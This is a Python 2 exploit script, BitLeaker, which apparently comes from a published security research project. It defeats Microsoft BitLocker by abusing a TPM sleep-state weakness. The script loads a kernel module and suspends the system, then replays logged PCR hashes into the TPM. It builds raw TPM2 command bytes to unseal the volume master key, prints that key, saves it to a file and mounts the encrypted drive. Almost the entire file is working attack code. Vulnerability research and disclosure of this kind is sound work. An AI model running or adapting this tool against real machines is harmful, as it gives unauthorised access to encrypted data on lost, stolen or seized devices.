#!/usr/bin/python2
#-*- coding: utf-8 -*-
#
#                           BitLeaker 
#                         ------------
#    Subverting Microsoft's BitLocker with One Vulnerability 
#
#               Copyright (C) 2019 Seunghun Han
#             at the Affiliated Institute of ETRI
#      Project link: https://github.com/kkamagui/bitleaker
#

import commands
import os
import sys
import re
from time import sleep

#
# TPM data for unseal VMK of BitLocker
#
data_tpm2_load_header = [0x80, 0x02, 0x00, 0x00, 0x00, 0xf7, 0x00, 0x00, 0x01, 0x57, 0x81, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x09, 0x40, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x00, 0x00]
data_tpm2_startsession = [0x80, 0x01, 0x00, 0x00, 0x00, 0x3b, 0x00, 0x00, 0x01, 0x76, 0x40, 0x00, 0x00, 0x07, 0x40, 0x00, 0x00, 0x07, 0x00, 0x20, 0xe3, 0x4c, 0xe2, 0xd5, 0x48, 0x7f, 0x73, 0x97, 0xb2, 0x8d, 0xb4, 0xe7, 0x93, 0xde, 0x4c, 0x36, 0x91, 0x8a, 0xa5, 0x1f, 0x3b, 0x48, 0x0c, 0x1f, 0x7f, 0x75, 0x79, 0xc5, 0xee, 0xfa, 0xa9, 0x83, 0x00, 0x00, 0x01, 0x00, 0x10, 0x00, 0x0b]
data_tpm2_policyauthorize = [0x80, 0x01, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x00, 0x01, 0x6b, 0x03, 0x00, 0x00, 0x00]
data_tpm2_pcrpolicy_header = [0x80, 0x01, 0x00, 0x00, 0x00, 0x3a, 0x00, 0x00, 0x01, 0x7f, 0x03, 0x00, 0x00, 0x00]
data_tpm2_pcrpolicy_subheader = [0x00, 0x00, 0x00, 0x01, 0x00, 0x0b]
data_tpm2_unseal = [0x80, 0x02, 0x00, 0x00, 0x00, 0x1b, 0x00, 0x00, 0x01, 0x5e, 0x80, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x09, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]

# SHA256 of bootmgfw.efi certificate, it is used for PCR #7
sha256_bootmgfw_cert = '30bf464ee37f1bc0c7b1a5bf25eced275347c3ab1492d5623ae9f7663be07dd5'

#
# Color codes
#
RED = '\033[1;31m'
GREEN = '\033[1;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
MAGENTA = '\033[1;35m'
CYAN = '\033[1;36m'
WHITE = '\033[1;37m'
ENDC = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'
BLINK = '\033[5m'
SUCCESS = GREEN
FAIL = RED

#
# Print colored message
#
def color_print(message, color):
    sys.stdout.write(color + message + ENDC)
    return

def info_print(message):
    color_print(message, BOLD)

#
# Show a banner.
#
def show_banner():
    banner = """\
                                                ,?????????????????????@???
                                               ????????????    ????????????
                                              ]?????????      ]?????????
                                              ]?????????      j?????????
                          ,                 ,???????????????
            ,??????,  ???@???@????????????????????????            ???????????????????????????????????????????????????.
        ??????@?????????????????? ????????????????????????????????????[           ??????????????????????????????????????????@????????????????????????
        ??????????????????????????? ????????????????????????????????????[           ????????????????????????????????????@@??????@?????????????????[
        ??????????????????????????? ??????????????????????????????..[           ??????????????? ???????????????????????????????????????????????????H
        ???                    ???`           ?????????????????????????????????????????????????????????????????????[
        ..????????????????????? ????????????????????????????????????            ?????????????????????????????????????????????????????????????????????[
        ??????????????????????????? ????????????????????????????????????[      ???????????,?????????????????????????????????????????????????????????????????????[
        ??????????????????????????? ?????????????????????????????????????????????????????????????????????????????????@?????????????????????????????????????????????????????????[
          ??????   ?????? ??????????????????????????????????????????????????????????????????????????????????????????@????????????????????????????????????????????????[
             ,,, ,??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????"`
        ,,.????????????????????????????????????????????????????????????????????????????????????????????????????????????]??????????????????????????????????????????  ]
        ?????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????? ??????
        ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
        ??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
        ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????"    ?????????
        ` "???``???????????????????????????????????????????????????????????????????????????????????????????????????????`    ???  ,,   ?????????
                 "` "??????????????????????????????????????????????????????????????????      ???, ??????   ,??? ???????????????
         ???   e             ??????????????????????????`            ?????? ?????????  ????????????????????????
         ???????????????????????????    ,       ,         ?????? ????????????  ????????????????????????????????????????????????
         ????????????,??????????????????  ???,     j??????    ??? ?????????????????????????????????????????????????????????????????????????????????
         ?????????????????????????????????????????????????????? ???????????????????????????????????????????????????????????????????????????????????????????????????????????????`
        ?????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
        ]?????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
        ??? ??????????????????????????????????????????????????????????????????????????????]??????????????????????????????????????????????????? ?????????; ??????
          ?????????????????????????????????????????????????????????????????????]??????]?????????????????? ???????????????????????????  ?????? ???  ???
          ??? ???????????????] ??????????????????????????????]?????????;??????]???????????? ??? ??????j???????????????   ???  !
            ??????L?????????   ??????  ?????? ??? ?????????!?????? ??? ???  ??? ????????? ??? ???
             ???L???       ??????  ??? ???      ??? ??? ??? ??? ???

""" + \
    GREEN +'    BitLeaker v1.0 for decrypting BitLocker with the TPM vulnerability\n' + ENDC + \
    '             Made by Seunghun Han, https://kkamagui.github.io\n' + \
    '           Project link: https://github.com/kkamagui/bitleaker \n'
    print banner

#
# Prepare PCR data from dmesg
#
def prepare_pcr_data():
    """
    [   27.955579] bitleaker: Virt FFFFAF80C55E0000 Phys 80000
    [   27.955582] bitleaker: evet_version = 2
    [   27.955588] bitleaker: TCG_PCR_EVENT size 36 TCG_PCR_EVENT2 size 12
    [   27.955595] bitleaker: Start 0x6f484000, End 0x6f48ebd5, Trunc 0
    [   27.955610] bitleaker: [1] PCR 0, Event 7, SHA256= 31 37 22 f6 4f 2a 08 57 c6 01 26 6c 89 bf 21 70 0a 7c 4e 79 dc 96 76 4c 2a 35 55 68 2a 3c 7b 7a 
    [   27.955627] bitleaker: [2] PCR 0, Event 8, SHA256= d4 72 0b 40 09 43 82 13 b8 03 56 80 17 f9 03 09 3f 6b ea 8a b4 7d 28 3d b3 2b 6e ab ed bb f1 55 
    [   27.955642] bitleaker: [3] PCR 0, Event 1, SHA256= db e1 4c 63 b7 d0 be dd 3f aa 9d b8 8f 9c 34 ad 75 a6 91 f7 c0 17 7f 70 1e ee 59 5d 44 d9 62 bc 
    [   27.955661] bitleaker: [4] PCR 7, Event 80000001, SHA256= cc fc 4b b3 28 88 a3 45 bc 8a ea da ba 55 2b 62 7d 99 34 8c 76 76 81 ab 31 41 f5 b0 1e 40 a4 0e 
    [   27.955678] bitleaker: [5] PCR 7, Event 80000001, SHA256= 78 68 42 98 cc 54 cf 75 50 bd 38 d3 c3 78 ee ee 59 d3 ae 02 76 32 cd a6 f5 07 ac 5c cd 25 7b 35 
    ... omitted ...
    [   27.957613] bitleaker: == End of Data ==
    """
    info_print('Loading BitLeaker kernel module... ')
    commands.getoutput('sudo insmod bitleaker-kernel-module/bitleaker-kernel-module.ko')
    color_print('Success\n', SUCCESS)
    
    info_print('Entering sleep...\n')
    info_print('    [>>] Please press any key or power button to wake up...')
    raw_input('')
    commands.getoutput('systemctl suspend')
    info_print('Waking up...\n')
    info_print('    [>>] Please press any key to continue...')
    raw_input('')
    info_print('\n')

    info_print('Preparing PCR data.\n')
    info_print('    [>>] Get PCR data from BitLeaker driver... '),
    output = commands.getoutput('sudo dmesg').split('\n')

    first_marker_found = 0
    second_marker_found = 0
    raw_data = []
    for line in output:
        if 'Dump event logs' in line:
            first_marker_found = 1

        if first_marker_found == 1 and 'SHA256' in line:
            second_marker_found = 1

        if second_marker_found == 1 and 'End of Data' in line:
            break

        if second_marker_found == 1:
            raw_data.append(line)
    
    if len(raw_data) == 0:
        color_print('Fail\n', FAIL)
        sys.exit(-1)
    color_print('Success\n\n', SUCCESS)

    return raw_data

#
# Cut PCR data and extract pcr_list
#
def cut_and_extract_essential_pcr_data(raw_data):
    """
    [   27.955610] bitleaker: [1] PCR 0, Event 7, SHA256= 31 37 22 f6 4f 2a 08 57 c6 01 26 6c 89 bf 21 70 0a 7c 4e 79 dc 96 76 4c 2a 35 55 68 2a 3c 7b 7a 
    """
    info_print('Cut and extract essential PCR data.\n')
   
    extracted_raw_data = []
    ev_separator_found = 0
    for line in raw_data:
        if ev_separator_found == 1 and 'PCR 7' in line:
            break
        
        if 'Event 4' in line:
            ev_separator_found = 1
 
        extracted_raw_data.append(line)

    info_print('    [>>] Extract PCR numbers and SHA256 hashes... ')
    
    # Extract PCR numbers and SHA256 hashes
    pcr_list = []
    for line in extracted_raw_data:
        # PCR number
        match = re.search(r'\d+?,', line)
        pcr_num = match.group(0).replace(',', ' ')
        
        # SHA 256
        match = re.search(r'(?<=SHA256=).*', line)
        sha256 = match.group(0).replace(' ', '')

        pcr_list.append([pcr_num, sha256])

    if len(pcr_list) != 0:
        color_print('Success\n\n', SUCCESS)
    else:
        color_print('Fail\n\n', FAIL)
        sys.exit(-1)

    return pcr_list

#
# Check resource manager is running and run it
#
def check_and_run_resource_manager():
    info_print('    [>>] Checking the resource manager process... ')
    sys.stdout.flush()

    output = commands.getoutput('sudo ps -e | grep resourcemgr')
    if 'resourcemgr' in output:
        color_print('Running\n', SUCCESS)
        return 0

    pid = os.fork()
    if pid == 0:
        commands.getoutput('sudo resourcemgr > /dev/null')
        sys.exit(0)
    else:
        # Wait for the resource manager
        resourcemgr_found = False

        for i in range(0, 10):
            output = commands.getoutput('ps -e | grep resourcemgr')
            if len(output) != 0:
                resourcemgr_found = True
                break

            sleep(1)

        if resourcemgr_found == False:
            color_print('Fail\n', FAIL)
            sys.exit(-1)

    color_print('Success\n', SUCCESS)
    sleep(3)
    return 0

#
# Replay PCR data to the TPM
#
def replay_pcr_data(pcr_list):
    info_print('Replay TPM data.\n')
    check_and_run_resource_manager()

    for pcr_data in pcr_list:
        info_print('    [>>] PCR %s, SHA256 = %s\n' % (pcr_data[0], pcr_data[1]))
        output = commands.getoutput('tpm2_extendpcrs -g 0x0b -P %s -i %s' % (pcr_data[0], pcr_data[1]))
        print output + '\n'

    # Last one for PCR #7
    info_print('    [>>] Last PCR 7, SHA256 = %s\n' % (sha256_bootmgfw_cert))
    output = commands.getoutput('tpm2_extendpcrs -g 0x0b -P 7 -i %s' % sha256_bootmgfw_cert)
    print output + '\n'

    os.system('sudo killall resourcemgr')
    
# 
# Extract TPM encoded blob from Dislocker tool
#
def get_raw_tpm_encoded_blob_from_dislocker(drive_path):
    """
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x00000000 00 8a 00 20 17 a4 c4 51-c1 ee 18 52 89 b0 e3 ac
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x00000010 39 65 f7 32 25 5b 87 ac-31 14 ed 1a 99 ac 62 4c
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x00000020 b2 90 b5 c1 00 10 8c cf-34 58 f5 1a 18 04 f9 2e
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x00000030 62 fa e3 93 a0 d1 ce 1f-49 99 9b ac 6d e8 27 97
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x00000040 c9 f9 c2 20 aa e7 23 1f-7c 68 1e 7e 74 65 c6 89
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x00000050 d9 f2 94 15 51 0f a1 8a-64 ae f6 c0 01 bb 8b 67
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x00000060 0a 2d 3b 65 15 f1 62 51-2d 8b 61 0d 8b 98 3f 76
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x00000070 b3 3f 64 7a 12 59 74 bb-60 e5 ad 5e 61 a1 31 3c
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x00000080 f9 90 17 6c fe 07 eb 49-20 69 55 66 00 4e 00 08
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x00000090 00 0b 00 00 04 12 00 20-6f b5 05 0c 0a 64 e6 ff
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x000000a0 2e 0a f1 8e 9c d8 26 40-87 44 b0 f2 08 4a bc a9
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x000000b0 c7 cd 7e 72 17 de cc f0-00 10 00 20 3d c3 40 aa
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x000000c0 98 5b 5b 48 50 9e 71 c2-19 03 0a bc bd 95 a6 10
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x000000d0 22 12 2d e3 e6 50 63 79-af f1 3c c4 00 20 5f f5
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x000000e0 9b 8f b8 7c 48 dc 43 68-60 eb a2 70 cc a2 22 4e
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x000000f0 7b b9 f0 83 ed fe 78 91-fa ed e2 b4 de 5a 03 80
    Thu Oct 10 15:01:04 2019 [DEBUG] 0x00000100 08 00
    """
    # Run Dislocker with debug mode
    output = commands.getoutput('sudo dislocker -v -v -v -v -V %s' % drive_path).split('\n')

    first_marker_found = 0
    second_marker_found = 0
    raw_data = []
    for line in output:
        if 'TPM_ENCODED' in line:
            first_marker_found = 1

        if first_marker_found == 1 and '0x00000000' in line:
            second_marker_found = 1

        if second_marker_found == 1:
            raw_data.append(line)

        if second_marker_found == 1 and not '0x000000' in line:
            break

    return raw_data

#
# Extract private/public data and PCR policy 
#
def extract_priv_pub_and_pcr_policy_from_raw_blob(raw_tpm_blob):
    hex_data = []
    for line in raw_tpm_blob:
        line = line.replace('-', ' ')
        line = line.replace('  ', ' ')
        data_list = line.split(' ')
        hex_data = hex_data + data_list[7:23]

    priv_pub = [int(hex_data[i], 16) for i in range(0, 220)]
    pcr_policy = [int(hex_data[i], 16) for i in range(220, len(hex_data) - 1)]
    return(priv_pub, pcr_policy)

#
# Prepare TPM data for unsealing VMK of BitLocker
#
def prepare_tpm_data(drive_path):
    info_print('Preparing TPM data.\n')
    info_print('    [>>] Get TPM-encoded blob from dislocker... ')
    raw_data_list = get_raw_tpm_encoded_blob_from_dislocker(drive_path)
    if raw_data_list == []:
        print('BitLeaker: Error. %s is not BitLocker-locked partition\n' % drive_path)
        sys.exit(-1)
    color_print('Success\n', SUCCESS)

    info_print('    [>>] Convert TPM-encoded blob to hex data... ')
    hex_priv_pub, pcr_policy = extract_priv_pub_and_pcr_policy_from_raw_blob(raw_data_list)
    color_print('Success\n', SUCCESS)

    # Prepare TPM2_Load data
    info_print('    [>>] Create TPM2_Load data... ')
    data = data_tpm2_load_header + hex_priv_pub
    file = open('tpm2_load.bin', 'wb')
    file.write(bytearray(data))
    file.close()
    color_print('Success\n', SUCCESS)

    # Prepare TPM2_StartSession data
    info_print('    [>>] Create TPM2_StartSession data... ')
    data = data_tpm2_startsession
    file = open('tpm2_startsession.bin', 'wb')
    file.write(bytearray(data))
    file.close()
    color_print('Success\n', SUCCESS)

    # Prepare TPM2_PolicyAuthorize data
    info_print('    [>>] Create TPM2_PolicyAuthorize data... ')
    data = data_tpm2_policyauthorize
    file = open('tpm2_policyauthorize.bin', 'wb')
    file.write(bytearray(data))
    file.close()
    color_print('Success\n', SUCCESS)

    # Prepare TPM2_PCRPolicy data
    info_print('    [>>] Create TPM2_PolicyPCR data... ')
    data1 = data_tpm2_pcrpolicy_header + pcr_policy[:len(pcr_policy) - 4]
    data2 = data_tpm2_pcrpolicy_subheader + pcr_policy[len(pcr_policy) - 4:]
    file = open('tpm2_policypcr.bin', 'wb')
    file.write(bytearray(data1))
    file.write(bytearray(data2))
    file.close()
    color_print('Success\n', SUCCESS)

    # Prepare TPM2_Unseal data
    info_print('    [>>] Create TPM2_Unseal data... ')
    data = data_tpm2_unseal
    file = open('tpm2_unseal.bin', 'wb')
    file.write(bytearray(data))
    file.close()
    color_print('Success\n\n', SUCCESS)

#
# Execute TPM2 command data for unsealing VMK 
#
def execute_tpm_cmd_and_extract_vmk():
    info_print('Execute TPM commands\n')
    
    # Execute TPM2_Load command 
    info_print('    [>>] Execute TPM2_Load... ')
    output = commands.getoutput('sudo tpmtcticlient -i tpm2_load.bin')
    print output
    if 'Fail' in output:
        color_print('    [>>] Fail\n\n', FAIL)
        sys.exit(-1)
    color_print('    [>>] Success\n\n', SUCCESS)
    sleep(2)

    # Execute TPM2_StartSession command 
    info_print('    [>>] Execute TPM2_StartSession... ')
    output = commands.getoutput('sudo tpmtcticlient -i tpm2_startsession.bin')
    print output
    if 'Fail' in output:
        color_print('    [>>] Fail\n\n', FAIL)
        sys.exit(-1)
    color_print('    [>>] Success\n\n', SUCCESS)
    sleep(2)

    # Execute TPM2_PolicyAuthorize command 
    info_print('    [>>] Execute TPM2_PolicyAuthorize... ')
    output = commands.getoutput('sudo tpmtcticlient -i tpm2_policyauthorize.bin')
    print output
    if 'Fail' in output:
        color_print('    [>>] Fail\n\n', FAIL)
        sys.exit(-1)
    color_print('    [>>] Success\n\n', SUCCESS)
    sleep(2)

    # Execute TPM2_PolicyPCR command 
    info_print('    [>>] Execute TPM2_PolicyAuthorize... ')
    output = commands.getoutput('sudo tpmtcticlient -i tpm2_policypcr.bin')
    print output
    if 'Fail' in output:
        color_print('    [>>] Fail\n\n', FAIL)
        sys.exit(-1)
    color_print('    [>>] Success\n\n', SUCCESS)
    sleep(2)

    # Execute TPM2_Unseal command 
    info_print('    [>>] Execute TPM2_Unseal... ')
    output = commands.getoutput('sudo tpmtcticlient -i tpm2_unseal.bin')
    print output
    if 'Fail' in output:
        color_print('    [>>] Fail\n\n', FAIL)
        sys.exit(-1)
        sys.exit(-1)
    color_print('    [>>] Success\n\n', SUCCESS)
    sleep(2)

    # Extract VMK from TPM result
    vmk_data = extract_vmk_from_tpm_result(output.split('\n'))
    return vmk_data

#
# Extract VMK from TPM result
#
def extract_vmk_from_tpm_result(tpm_output):
    """
    [>>] Execute TPM2_Unseal... Input file tpm2_unseal.bin
Initializing Local Device TCTI Interface
    [>>] Input Size 27
00000000  80 02 00 00 00 1b 00 00  01 5e 80 00 00 01 00 00  |.........^......|
00000010  00 09 03 00 00 00 00 00  00 00 00                 |...........|

    [>>] Output Size 97, Result: Success
00000000  80 02 00 00 00 61 00 00  00 00 00 00 00 2e 00 2c  |.....a.........,|
00000010  2c 00 05 00 01 00 00 00  03 20 00 00 88 2e b7 28  |,........ .....(|
00000020  33 cd 21 05 f5 38 ea 60  89 51 62 e8 61 5b 0c ed  |3.!..8.`.Qb.a[..|
00000030  6a 63 7e f9 17 83 55 e9  0f 70 95 09 00 20 df e3  |jc~...U..p... ..|
00000040  75 69 1f e8 30 33 ef 3f  10 49 e3 53 de 18 e4 f1  |ui..03.?.I.S....|
00000050  0c e2 18 dd 7c bf ab 1d  6d 63 38 ec d1 f3 00 00  |....|...mc8.....|
00000060  00                                                |.|
Success
    """
    output_found = 0
    vmk_data = []
    for line in tpm_output:
        if 'Output Size' in line:
            output_found = 1
            continue

            if not 'Success' in line:
                return []

        if output_found == 1 and not '0000' in line:
            break
       
        if output_found == 1:
            data = line.split('|')
            data = data[0].split()
            vmk_data = vmk_data + data[1:17]

    vmk_data = [int(vmk_data[i], 16) for i in range(28, 60)]
    return vmk_data

#
# Mount BitLocker-locked partition with the VMK
#
def mount_bitlocker_partition_with_vmk(drive_path, vmk_data):
    info_print('Mount BitLocker-locked Partition with VMK.\n')

    # Print VMK
    color_print('    [>>] VMK = ', GREEN)
    for hex in vmk_data:
        color_print('%02X'% hex, GREEN)
    info_print('\n')

    # Prepare TPM2_Load data
    info_print('    [>>] Create VMK data... ')
    file = open('vmk.bin', 'wb')
    file.write(bytearray(vmk_data))
    file.close()
    color_print('Success\n', SUCCESS)

    # Mount BitLocker-locked partition
    commands.getoutput('mkdir windows')
    info_print('    [>>] Mount BitLocker-Locked partition(%s)...\n\n' % drive_path)
    output = commands.getoutput('sudo dislocker -v -v -v -V %s -K vmk.bin -- ./windows' % drive_path)
    print output
    output = commands.getoutput('sudo mount -o loop ./windows/dislocker-file ./windows')

#   
# Main
#
if __name__ == '__main__':
    # Show a banner
    show_banner()

    # Searching for BitLocker-locked partitions
    info_print('Search for BitLocker-locked partitions.\n')

    if len(sys.argv) != 2:
        output = commands.getoutput('sudo fdisk -l 2>/dev/null | grep "Microsoft basic data"').split('\n')
        if len(output) == 0:
            color_print('    [>>] BitLocker-locked partition is not found.\n', FAIL)
            info_print('    [>>] Please try with the explicit drive path. ./bitleaker.py <drive path>\n')
            sys.exit(-1)

        drive_path = output[0].split(' ')[0]
    else:
        drive_path = sys.argv[1]

    info_print('    [>>] BitLocker-locked partition is [%s]\n\n' % drive_path)

    # Prepare PCR data
    raw_data = prepare_pcr_data()
    pcr_list = cut_and_extract_essential_pcr_data(raw_data)
    replay_pcr_data(pcr_list)

    # Prepare TPM data and extract VMK
    prepare_tpm_data(drive_path)
    vmk_data = execute_tpm_cmd_and_extract_vmk()
   
    # Mount BitLocker-locked partition with VMK
    mount_bitlocker_partition_with_vmk(drive_path, vmk_data)

